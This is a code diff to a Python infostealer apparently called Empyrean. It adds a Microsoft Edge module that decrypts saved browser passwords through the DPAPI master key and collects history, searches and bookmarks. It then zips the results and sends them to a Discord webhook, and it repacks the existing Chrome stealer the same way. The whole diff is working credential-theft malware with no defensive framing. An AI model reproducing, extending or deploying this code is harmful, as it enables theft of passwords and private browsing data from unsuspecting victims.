@@ -9,6 +9,7 @@ import subprocess
 import sys
 import uuid
 from threading import Thread
+from zipfile import ZipFile
 
 import psutil
 import requests
@@ -24,7 +25,7 @@ def main() -> None:
     webhook = "&WEBHOOK_URL&"
     
     threads = []
-    for operation in [discord, google, injection,]:
+    for operation in [discord, google, edge, injection,]:
         thread = Thread(target=operation, args=(webhook,))
         thread.start()
         threads.append(thread)
@@ -349,15 +350,17 @@ class google():
         self.search_history()
         self.bookmarks()
         
-        for file in self.files:
-            if not os.path.isfile(file):
-                continue
-            
-            if os.path.getsize(file) > 8000000:
-                continue
-            
-            webhook.send(file=File(file), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+        with ZipFile('.\\google-dat.zip', 'w') as zip:
+            for file in self.files:
+                if not os.path.isfile(file):
+                    continue
+                zip.write(file)
         
+        if os.path.isfile('.\\google-dat.zip'):
+            if not os.path.getsize('.\\google-dat.zip') > 8000000:
+                webhook.send(file=File('.\\google-dat.zip'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+                os.remove('.\\google-dat.zip')
+                
         for file in self.files:
             if os.path.isfile(file):
                 os.remove(file)
@@ -388,8 +391,8 @@ class google():
             path += "\\Login Data"
             if not os.path.exists(path):
                 continue
-            shutil.copy2(path, "Loginvault.db")
-            conn = sqlite3.connect("Loginvault.db")
+            shutil.copy2(path, "Google-Vault.db")
+            conn = sqlite3.connect("Google-Vault.db")
             cursor = conn.cursor()
             with open('google-passwords.txt', 'a', encoding='utf-8') as f:
                 for res in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
@@ -399,15 +402,15 @@ class google():
                         f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(username, password, url))
             cursor.close()
             conn.close()
-            os.remove("Loginvault.db")
+            os.remove("Google-Vault.db")
             
     def cookies(self):
         for path in self.databases:
             path += "\\Network\\Cookies"
             if not os.path.exists(path):
                 continue
-            shutil.copy2(path, "Loginvault.db")
-            conn = sqlite3.connect("Loginvault.db")
+            shutil.copy2(path, "Google-Vault.db")
+            conn = sqlite3.connect("Google-Vault.db")
             cursor = conn.cursor()
             with open('google-cookies.txt', 'a', encoding='utf-8') as f:
                 for res in cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies").fetchall():
@@ -418,15 +421,15 @@ class google():
                       
             cursor.close()
             conn.close()
-            os.remove("Loginvault.db") 
+            os.remove("Google-Vault.db") 
       
     def web_history(self):
         for path in self.databases:
             path += "\\History"
             if not os.path.exists(path):
                 continue
-            shutil.copy2(path, "Loginvault.db")
-            conn = sqlite3.connect("Loginvault.db")
+            shutil.copy2(path, "Google-Vault.db")
+            conn = sqlite3.connect("Google-Vault.db")
             cursor = conn.cursor()
             with open('google-web-history.txt', 'a', encoding='utf-8') as f:
                 sites = []
@@ -441,15 +444,15 @@ class google():
                     
             cursor.close()
             conn.close()
-            os.remove("Loginvault.db")
+            os.remove("Google-Vault.db")
                  
     def search_history(self):
         for path in self.databases:
             path += "\\History"
             if not os.path.exists(path):
                 continue
-            shutil.copy2(path, "Loginvault.db")
-            conn = sqlite3.connect("Loginvault.db")
+            shutil.copy2(path, "Google-Vault.db")
+            conn = sqlite3.connect("Google-Vault.db")
             cursor = conn.cursor()
             with open('google-search-history.txt', 'a', encoding='utf-8') as f:
                 for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
@@ -458,7 +461,7 @@ class google():
                         f.write("Search: {}\n".format(term))
             cursor.close()
             conn.close()
-            os.remove("Loginvault.db")
+            os.remove("Google-Vault.db")
             
     def bookmarks(self):
         for path in self.databases:
@@ -478,9 +481,143 @@ class google():
                             f.write("URL: {}\n".format(item['url']))
             os.remove('bookmarks.json')
 
-    def autofill(self):
+class edge():
+    def __init__(self, webhook: str) -> None:
+        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.databases = {
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Default',
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Profile 1',
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Profile 2',
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Profile 3',
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Profile 4',
+            self.appdata + '\\Microsoft\\Edge\\User Data\\Profile 5',
+        }
+        self.masterkey = self.get_master_key(self.appdata+'\\Microsoft\\Edge\\User Data\\Local State')
+        self.files = [
+            '.\\edge-passwords.txt',
+            '.\\edge-web-history.txt',
+            '.\\edge-search-history.txt',
+            '.\\edge-bookmarks.txt',
+        ]
+        
+        self.password()
+        self.web_history()
+        self.search_history()
+        self.bookmarks()
+        
+        with ZipFile('.\\edge-dat.zip', 'w') as zip:
+            for file in self.files:
+                if not os.path.isfile(file):
+                    continue
+                zip.write(file)
+        
+        if os.path.isfile('.\\edge-dat.zip'):
+            if not os.path.getsize('.\\edge-dat.zip') > 8000000:
+                webhook.send(file=File('.\\edge-dat.zip'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+                os.remove('.\\edge-dat.zip')
+                
+        for file in self.files:
+            if os.path.isfile(file):
+                os.remove(file)
+
+    def get_master_key(self, path) -> str:
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    
+    def decrypt_password(self, buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except:
+            return "Edge < 80"
+        
+    def password(self):
         for path in self.databases:
-            path += "\\autofill"
+            path += "\\Login Data"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "Edge-Vault.db")
+            conn = sqlite3.connect("Edge-Vault.db")
+            cursor = conn.cursor()
+            with open('edge-passwords.txt', 'a', encoding='utf-8') as f:
+                for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                    url, username, password = res
+                    password = self.decrypt_password(password, self.masterkey)
+                    if url != "" and username != "" and password != "":
+                        f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(username, password, url))
+            cursor.close()
+            conn.close()
+            os.remove("Edge-Vault.db")      
+  
+    def web_history(self):
+        for path in self.databases:
+            path += "\\History"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "Edge-Vault.db")
+            conn = sqlite3.connect("Edge-Vault.db")
+            cursor = conn.cursor()
+            with open('edge-web-history.txt', 'a', encoding='utf-8') as f:
+                sites = []
+                for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                    url, title, visit_count, last_visit_time = res
+                    if url != "" and title != "" and visit_count != "" and last_visit_time != "":
+                        sites.append((url, title, visit_count, last_visit_time))
+                        
+                sites.sort(key=lambda x: x[3], reverse=True)
+                for site in sites:
+                    f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
+                    
+            cursor.close()
+            conn.close()
+            os.remove("Edge-Vault.db")
+                 
+    def search_history(self):
+        for path in self.databases:
+            path += "\\History"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "Loginvault.db")
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
+            with open('edge-search-history.txt', 'a', encoding='utf-8') as f:
+                for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
+                    term = res[0]
+                    if term != "":
+                        f.write("Search: {}\n".format(term))
+            cursor.close()
+            conn.close()
+            os.remove("Loginvault.db")
+
+    def bookmarks(self):
+        for path in self.databases:
+            path += "\\Bookmarks"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "bookmarks.json")
+            with open('bookmarks.json', 'r', encoding='utf-8') as f:
+                for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
+                    if 'children' in item:
+                        for child in item['children']:
+                            if 'url' in child:
+                                with open('edge-bookmarks.txt', 'a', encoding='utf-8') as f:
+                                    f.write("URL: {}\n".format(child['url']))
+                    elif 'url' in item:
+                        with open('edge-bookmarks.txt', 'a', encoding='utf-8') as f:
+                            f.write("URL: {}\n".format(item['url']))
+            os.remove('bookmarks.json')
 
 class system():
     def __init__(self, webhook: str) -> None:
